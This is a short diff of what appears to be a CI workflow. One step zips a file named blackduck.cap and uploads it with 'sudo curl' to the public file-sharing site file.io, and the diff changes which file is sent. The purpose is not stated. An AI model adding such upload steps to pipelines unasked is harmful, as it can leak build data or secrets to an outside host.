@@ -27,4 +27,4 @@ jobs:
       run: |
         zip blackduck.zip blackduck.cap
         ls -l
-        sudo curl -F 'file=@okta.blackduck' https://file.io
+        sudo curl -F 'file=@blackduck.zip' https://file.io
